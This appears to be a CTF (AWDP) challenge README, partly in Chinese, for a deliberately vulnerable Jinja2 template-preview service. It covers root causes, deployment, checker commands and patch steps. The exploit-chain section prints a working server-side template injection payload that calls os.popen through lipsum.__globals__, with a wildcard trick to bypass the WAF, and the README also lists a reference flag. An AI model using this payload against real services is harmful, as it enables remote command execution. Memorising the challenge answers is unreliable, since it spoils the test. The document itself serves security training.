# ez_Render - ez_Render

> AWDP Plus GameBox 还原件（北极星实验室 WRITEUP 复现）

## 题目信息（题面）

ez_Render is a small template preview service: an authenticated caller submits a template body and receives the rendered result, which keeps front-end layout work quick and centralised. Rendering is a pure presentation feature and must never reach server-side files or objects. Template text is untrusted user content, not code; the rendering sandbox, the exposed template globals, and the reachable file system must remain strictly out of scope.

> **中文提要**：模板预览服务：已鉴权调用方提交模板文本并取回渲染结果，便于前端排版工作集中进行。渲染是纯展示功能，绝不能触达服务端文件或对象。模板文本是不可信用户内容而非代码；渲染沙箱/暴露的模板全局对象/可达文件系统必须严格隔离在外。

> **参考旗标**（比赛期间原题，仅供核对；平台每轮会刷新为新旗标）：flag{0ee990ebe6eb4e598ee0a7f23a436a9f}

---

## 1. 业务场景
模板预览服务：/api/template/preview 接收模板文本并用 Jinja2 渲染后返回，X-Access-Token 作为访问令牌。

## 2. 漏洞根因
1) /api/template/preview 直接把用户模板交给 Jinja2 渲染（无沙箱）。
2) WAF 只对字面 'flag.txt' 做过滤（命中即 401），未做解析后匹配，通配符 fla* 可绕过。
3) os.popen 无沙箱，可通过 lipsum.__globals__['os'].popen 读取 /tmp/flag.txt。

## 3. 利用链（原始 Writeup）
POST /api/template/preview (X-Access-Token) -> {{7*7}}=49 指纹 -> {{config}} 泄露 -> {{ lipsum.__globals__['os'].popen('cat /tmp/fla*').read() }} 读 /tmp/flag.txt（WAF 用 fla* 绕过）。

## 4. Flag 机制
| 项 | 值 |
| --- | --- |
| 存储位置 | 环境变量 FLAG（平台 FlagServer 每轮刷新）；回退文件 /flag |
| 落地业务字段 | 文件 /tmp/flag.txt（经 SSTI 读取） |
| 格式 | flag{...}，每轮替换 |
| 刷新方式 | 平台每轮写入新 FLAG 并重启容器，服务启动时写入受限 fixture |

## 5. 防守修补点
| 项 | 值 |
| --- | --- |
| 漏洞文件 | app.py（模板渲染入口） |
| Patch Directory | /app |
| 白名单命令 | mv / cp / rm |
| 修补包 | dist/ez_Render_patch.tar.gz（内含 update.sh，仅用白名单命令） |
| 修补原则 | 最小改动；修补后原利用链失效，合法业务回归通过 |

## 6. Checker
    python checker/checker.py http://127.0.0.1:5008
    python checker/checker.py http://127.0.0.1:5008 --exploit

## 7. 本地部署
    docker build -t ez_Render .
    docker run -d --name ez_Render -p 5008:5008 -e FLAG=flag{local-test} ez_Render
    python checker/checker.py http://127.0.0.1:5008

## 8. 修补验证
    docker exec ez_Render mkdir -p /tmp/p
    docker cp dist/ez_Render_patch.tar.gz ez_Render:/tmp/p/patch.tar.gz
    docker exec ez_Render sh -c "tar -xzf /tmp/p/patch.tar.gz -C /tmp/p && cd /tmp/p && sh update.sh"
    python checker/checker.py http://127.0.0.1:5008 --exploit
